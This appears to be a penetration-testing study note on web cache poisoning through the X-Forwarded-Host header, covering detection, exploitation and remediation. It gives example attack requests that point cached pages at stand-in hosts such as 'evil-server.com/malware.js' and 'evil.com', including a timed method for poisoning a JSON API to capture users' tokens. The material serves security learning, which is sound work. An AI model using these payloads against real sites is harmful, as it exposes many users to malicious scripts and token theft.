---
tags: [vapt, cache, infrastructure, intermediate]
difficulty: intermediate
module: "27 - Web Cache Poisoning and Deception"
topic: "27.03 Cache Poisoning via X-Forwarded-Host"
---

# 27.03 — Cache Poisoning via X-Forwarded-Host

## What is it?
`X-Forwarded-Host` (XFH) is an HTTP header used by reverse proxies to tell the backend server what the original `Host` header was when the user's request arrived. 

For example, if a user goes to `https://www.store.com`, the Cloudflare proxy might forward the request to an internal AWS server via `Host: internal-aws-server.local`. To let the AWS server know the user actually typed `www.store.com`, Cloudflare appends `X-Forwarded-Host: www.store.com`.

**The Vulnerability:** Many web frameworks (like Django, Rails, or Laravel) are configured to automatically trust the `X-Forwarded-Host` header over the standard `Host` header when generating absolute URLs for things like password reset links, `<script>` tags, or Open Graph meta tags. 

If a caching layer sits in front of the application, and the caching layer treats `X-Forwarded-Host` as an **Unkeyed Input** (meaning it ignores it when creating the cache fingerprint), an attacker can poison the cache. The attacker injects `X-Forwarded-Host: evil.com`. The backend generates HTML pointing to `evil.com`. The cache saves this HTML under the normal URL path. Legitimate users are then served the poisoned HTML.

## ASCII Diagram
```text
================================================================================
                    POISONING VIA X-FORWARDED-HOST
================================================================================

[1. Attacker Sends Payload]
GET /login HTTP/1.1
Host: target.com
X-Forwarded-Host: evil-server.com/malware.js?

[2. Backend Generates HTML]
Backend framework reads X-Forwarded-Host to build the analytics script tag.
<script src="https://evil-server.com/malware.js?/analytics/tracking.js"></script>

[3. Cache Saves the Response]
Cache stores the HTML under Cache Key: GET /login | target.com

[4. Victim Requests the Page]
GET /login HTTP/1.1
Host: target.com

[5. Cache Serves Poisoned HTML]
Victim's browser parses the HTML and downloads malware.js from the attacker!
================================================================================
```

## How to Find It
- **Manual steps:**
  1. Pick a high-traffic endpoint (e.g., the homepage or a login page).
  2. Append a cachebuster query parameter to ensure you hit the backend: `GET /?cb=123`.
  3. Add the header `X-Forwarded-Host: example.com`.
  4. Inspect the HTTP response body. Search for `example.com`.
  5. If `example.com` appears in the `href` of a `<link>` tag, the `src` of a `<script>` tag, or an `og:url` meta tag, the backend is trusting the header.
  6. Remove the `X-Forwarded-Host` header, keep the `?cb=123`, and resend the request. If the response *still* contains `example.com`, you have successfully poisoned the cache for that specific URL.

- **Other X-Forwarded Variations:**
  If `X-Forwarded-Host` doesn't work, try its variations:
  - `X-Host`
  - `X-Forwarded-Server`
  - `Forwarded: host=example.com`
  - `Host: example.com` (Sometimes sending TWO Host headers causes the proxy to use the first, and the backend to use the second).

## How to Exploit It
- **Step-by-step walkthrough:**
  Let's poison a JSON API.
  1. The endpoint `GET /api/v1/user/config` returns a JSON object containing the URL of the API gateway.
     ```json
     { "gateway": "https://api.target.com/v2/" }
     ```
  2. You send `GET /api/v1/user/config?cb=1` with `X-Forwarded-Host: evil.com`.
  3. The backend responds:
     ```json
     { "gateway": "https://evil.com/v2/" }
     ```
  4. Now you must poison the live cache. Wait until the `Age` header of the live `/api/v1/user/config` endpoint approaches its `max-age` (e.g., if max-age is 60, wait until Age is 59).
  5. Send the `X-Forwarded-Host: evil.com` payload repeatedly without the cachebuster.
  6. Once the cache expires, your poisoned request will hit the backend, and the cache will save your poisoned JSON.
  7. The frontend Javascript of legitimate users will now send all their API requests (and authentication tokens) to `evil.com/v2/`!

- **Actual payloads:**
  **Basic Probe:**
  ```http
  GET / HTTP/1.1
  Host: www.target.com
  X-Forwarded-Host: burpcollaborator.net
  ```

## Real-World Example
A bug bounty hunter found a cache poisoning vulnerability on a major e-commerce site. The site dynamically generated the URL for a required JavaScript file based on the `X-Forwarded-Host` header. The hunter poisoned the cache for the homepage, changing the script source to their own server. Their custom script simply contained `console.log("Hacked")`. However, had they been malicious, they could have written a script that read the user's credit card details from the DOM during checkout and exfiltrated them. Because the cache saved this payload for 24 hours, the attacker could have compromised thousands of checkouts with a single HTTP request.

## How to Fix It
- **Developer remediation:**
  1. **Do Not Trust XFH:** Do not blindly trust the `X-Forwarded-Host` header. If the application requires absolute URLs, configure a hardcoded `BASE_URL` in the environment variables (e.g., `BASE_URL = "https://www.store.com"`) and use that to generate links, completely ignoring client-supplied headers.
  2. **Cache Key Configuration:** If the application *must* support multiple dynamic domains via XFH, configure the CDN or Varnish Cache to include the `X-Forwarded-Host` header in the Cache Key. This prevents an attacker's `evil.com` request from overwriting the cache for `store.com`.

## Chaining Opportunities
- This vuln + [[07 - Cache Poisoning to Deliver XSS]] → Using XFH to rewrite script tags is the primary method for delivering Stored XSS via Cache Poisoning.
- This vuln + [[08 - Cache Poisoning to Redirect Users]] → If the application uses XFH to generate 302 Redirects, you can poison the cache to steal traffic.

## Related Notes
- [[02 - Cache Keys and Unkeyed Inputs]]
- [[04 - Cache Poisoning via X-Forwarded-Scheme]]
